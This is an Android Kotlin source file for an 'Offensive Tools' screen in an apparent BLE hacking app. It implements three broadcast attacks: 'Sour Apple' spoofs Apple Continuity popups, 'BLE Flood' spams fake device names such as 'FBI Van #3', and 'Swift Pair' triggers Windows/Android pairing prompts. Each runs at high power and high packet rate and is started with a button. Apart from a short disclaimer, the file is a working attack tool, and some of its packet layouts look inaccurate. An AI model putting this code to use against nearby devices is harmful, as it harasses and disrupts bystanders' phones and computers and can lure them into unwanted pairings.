package com.ghostech.blehound

import android.app.Activity
import android.app.AlertDialog
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.ParcelUuid
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import java.util.UUID

class OffensiveToolsActivity : Activity() {

    private var advertiser: BluetoothLeAdvertiser? = null
    private var isAttacking = false
    private val handler = Handler(Looper.getMainLooper())
    private var statusText: TextView? = null
    private var packetsText: TextView? = null
    private var packetCount = 0
    private var currentAttack = ""
    private val activeCallbacks = mutableListOf<AdvertiseCallback>()

    // Apple Continuity device models (type byte, model bytes)
    private val appleDevices = listOf(
        byteArrayOf(0x10, 0x05, 0x01),  // AirPods
        byteArrayOf(0x10, 0x02, 0x20),  // AirPods Pro
        byteArrayOf(0x10, 0x0A, 0x20),  // AirPods Max
        byteArrayOf(0x10, 0x0E, 0x20),  // AirPods Pro 2
        byteArrayOf(0x10, 0x14, 0x20),  // AirPods 3
        byteArrayOf(0x10, 0x00, 0x55),  // AirTag
    )

    // Apple Continuity actions
    private val appleActions = listOf(
        byteArrayOf(0x09, 0x01),  // Setup New iPhone
        byteArrayOf(0x06, 0x02),  // Pair Apple TV
        byteArrayOf(0x0B, 0x01),  // HomePod Setup
        byteArrayOf(0x0D, 0x04),  // Apple Vision Pro
        byteArrayOf(0x07, 0x06),  // Pair Beats
        byteArrayOf(0x14, 0x06),  // Transfer Number
    )

    // Spam names for BLE flood
    private val spamNames = listOf(
        "\uD83D\uDC1D nyanbee", "\uD83D\uDC1D BUZZ BUZZ", "\uD83C\uDF6F Honey Trap",
        "\uD83D\uDC1D Queen Bee", "\uD83D\uDC1D The Hive", "\uD83D\uDC1D Stinger",
        "\uD83D\uDC1D Save the Bees", "\uD83D\uDC1D Hivemind", "\uD83D\uDC1D CK42X.COM",
        "Free WiFi", "AirDrop - iPhone", "Galaxy Buds Pro", "Bose QC45",
        "Listening Device", "FBI Van #3", "Crypto Wallet",
        "Toilet", "Your Mom", "Do Not Connect"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        advertiser = btManager.adapter?.bluetoothLeAdvertiser

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF000000.toInt())
        }

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(24), dp(18), dp(14))
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF2A0000.toInt(), 0xFF140000.toInt(), 0xFF000000.toInt())
            ).apply { setStroke(dp(1), themeColor(this@OffensiveToolsActivity)) }
        }

        val title = TextView(this).apply {
            text = "OFFENSIVE TOOLS"
            gravity = Gravity.CENTER
            textSize = 20f
            typeface = Typeface.create("sans-serif-black", Typeface.BOLD_ITALIC)
            setTextColor(themeColor(this@OffensiveToolsActivity))
        }
        val subtitle = TextView(this).apply {
            text = "BLE advertisement attacks"
            gravity = Gravity.CENTER
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(4), 0, 0)
        }
        header.addView(title)
        header.addView(subtitle)

        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(24))
        }

        // Status display
        statusText = TextView(this).apply {
            text = "IDLE"
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF44FF44.toInt())
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(4))
        }
        packetsText = TextView(this).apply {
            text = "Packets: 0"
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF666666.toInt())
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(12))
        }
        content.addView(statusText)
        content.addView(packetsText)

        // Attack buttons
        val sourAppleBtn = buildAttackButton("SOUR APPLE", "Spoof Apple Continuity popups on nearby iOS devices")
        sourAppleBtn.setOnClickListener { confirmAndRun("Sour Apple") { startSourApple() } }
        content.addView(sourAppleBtn)

        val bleFloodBtn = buildAttackButton("BLE FLOOD", "Flood nearby Bluetooth lists with fake device names")
        bleFloodBtn.setOnClickListener { confirmAndRun("BLE Flood") { startBleFlood() } }
        content.addView(bleFloodBtn)

        val swiftPairBtn = buildAttackButton("SWIFT PAIR", "Trigger Windows/Android pairing popups")
        swiftPairBtn.setOnClickListener { confirmAndRun("Swift Pair") { startSwiftPair() } }
        content.addView(swiftPairBtn)

        // Stop button
        val stopBtn = Button(this).apply {
            text = "STOP ATTACK"
            isAllCaps = true
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF000000.toInt())
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFFFF4444.toInt(), 0xFFCC0000.toInt())
            ).apply { cornerRadius = dp(18).toFloat() }
            setPadding(dp(10), dp(16), dp(10), dp(16))
        }
        stopBtn.setOnClickListener { stopAttack() }
        content.addView(stopBtn)

        // Disclaimer
        content.addView(TextView(this).apply {
            text = "For authorized security testing only. You are responsible for compliance with applicable laws."
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF444444.toInt())
            setPadding(0, dp(16), 0, 0)
            gravity = Gravity.CENTER
        })

        scroll.addView(content)

        val backContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(0), dp(16), dp(20))
        }
        val backBtn = buildHellButton("BACK")
        backBtn.setOnClickListener { finish() }
        backContainer.addView(backBtn)

        root.addView(header)
        root.addView(scroll)
        root.addView(backContainer)
        setContentView(root)
    }

    private fun confirmAndRun(name: String, action: () -> Unit) {
        if (isAttacking) {
            stopAttack()
            return
        }
        if (advertiser == null) {
            statusText?.text = "BLE ADVERTISE NOT AVAILABLE"
            statusText?.setTextColor(0xFFFF4444.toInt())
            return
        }
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            return
        }
        AlertDialog.Builder(this)
            .setTitle("Launch $name?")
            .setMessage("This will broadcast BLE advertisements to nearby devices. For authorized testing only.")
            .setNegativeButton("Cancel", null)
            .setPositiveButton("Launch") { _, _ ->
                currentAttack = name
                packetCount = 0
                isAttacking = true
                statusText?.text = "$name ACTIVE"
                statusText?.setTextColor(0xFFFF4444.toInt())
                action()
            }
            .show()
    }

    // ─── SOUR APPLE ───
    private fun startSourApple() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return
                try {
                    stopCurrentAdvertising()

                    val device = appleDevices.random()
                    val action = appleActions.random()

                    // Apple Continuity manufacturer data
                    val mfgData = ByteArray(17)
                    mfgData[0] = 0x02  // iBeacon-like type
                    mfgData[1] = 0x15  // Length
                    System.arraycopy(device, 0, mfgData, 2, device.size.coerceAtMost(3))
                    System.arraycopy(action, 0, mfgData, 5, action.size.coerceAtMost(2))
                    // Fill rest with random bytes
                    for (i in 7 until mfgData.size) mfgData[i] = (Math.random() * 256).toInt().toByte()

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false)
                        .setTimeout(0)
                        .build()

                    val data = AdvertiseData.Builder()
                        .addManufacturerSpecificData(0x004C, mfgData) // Apple company ID
                        .build()

                    val callback = createCallback()
                    advertiser?.startAdvertising(settings, data, callback)
                    activeCallbacks.add(callback)
                    packetCount++
                    packetsText?.text = "Packets: $packetCount"
                } catch (e: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                    return
                }
                handler.postDelayed(this, 50) // 20 packets/sec
            }
        }
        handler.post(runnable)
    }

    // ─── BLE FLOOD ───
    private fun startBleFlood() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return
                try {
                    stopCurrentAdvertising()

                    val name = spamNames.random()

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false)
                        .setTimeout(0)
                        .build()

                    val data = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .addServiceUuid(ParcelUuid(UUID.randomUUID()))
                        .build()

                    val scanResponse = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .addServiceData(
                            ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")),
                            name.toByteArray(Charsets.UTF_8).take(20).toByteArray()
                        )
                        .build()

                    // Set device name for scan response
                    try {
                        val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                        adapter?.setName(name.take(20))
                    } catch (_: SecurityException) {}

                    val callback = createCallback()
                    advertiser?.startAdvertising(settings, data, scanResponse, callback)
                    activeCallbacks.add(callback)
                    packetCount++
                    packetsText?.text = "Packets: $packetCount | $name"
                } catch (e: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                    return
                }
                handler.postDelayed(this, 100) // 10 names/sec
            }
        }
        handler.post(runnable)
    }

    // ─── SWIFT PAIR ───
    private fun startSwiftPair() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return
                try {
                    stopCurrentAdvertising()

                    // Microsoft Swift Pair manufacturer data
                    val mfgData = byteArrayOf(
                        0x03, 0x00,       // Swift Pair scenario
                        0x80.toByte(),    // RSSI filter
                        0x00,             // Vendor-specific
                        (Math.random() * 256).toInt().toByte(),
                        (Math.random() * 256).toInt().toByte()
                    )

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false)
                        .setTimeout(0)
                        .build()

                    val data = AdvertiseData.Builder()
                        .addManufacturerSpecificData(0x0006, mfgData) // Microsoft company ID
                        .build()

                    val callback = createCallback()
                    advertiser?.startAdvertising(settings, data, callback)
                    activeCallbacks.add(callback)
                    packetCount++
                    packetsText?.text = "Packets: $packetCount"
                } catch (e: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                    return
                }
                handler.postDelayed(this, 80) // ~12 packets/sec
            }
        }
        handler.post(runnable)
    }

    private fun stopCurrentAdvertising() {
        try {
            for (cb in activeCallbacks) {
                advertiser?.stopAdvertising(cb)
            }
            activeCallbacks.clear()
        } catch (_: SecurityException) {}
    }

    private fun stopAttack() {
        isAttacking = false
        handler.removeCallbacksAndMessages(null)
        stopCurrentAdvertising()
        statusText?.text = "STOPPED"
        statusText?.setTextColor(0xFF44FF44.toInt())
    }

    private fun createCallback() = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {}
        override fun onStartFailure(errorCode: Int) {
            runOnUiThread {
                statusText?.text = "ADVERTISE FAILED (code $errorCode)"
                statusText?.setTextColor(0xFFFF8800.toInt())
            }
        }
    }

    override fun onDestroy() {
        stopAttack()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            statusText?.text = "PERMISSION GRANTED. TAP AGAIN."
            statusText?.setTextColor(0xFF44FF44.toInt())
        }
    }

    private fun buildAttackButton(label: String, desc: String): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF4A0000.toInt(), 0xFF1A0000.toInt())
            ).apply {
                cornerRadius = dp(18).toFloat()
                setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
            }
            setPadding(dp(16), dp(14), dp(16), dp(14))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(0, 0, 0, dp(8))
            layoutParams = lp
        }
        container.addView(TextView(this).apply {
            text = label
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFFFFF1E0.toInt())
        })
        container.addView(TextView(this).apply {
            text = desc
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(2), 0, 0)
        })
        return container
    }

    private fun buildHellButton(label: String) = Button(this).apply {
        text = label
        isAllCaps = true
        textSize = 13f
        typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
        setTextColor(0xFFFFF1E0.toInt())
        background = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(0xFF6A0000.toInt(), 0xFF260000.toInt())
        ).apply {
            cornerRadius = dp(18).toFloat()
            setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
        }
        setPadding(dp(10), dp(14), dp(10), dp(14))
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
}
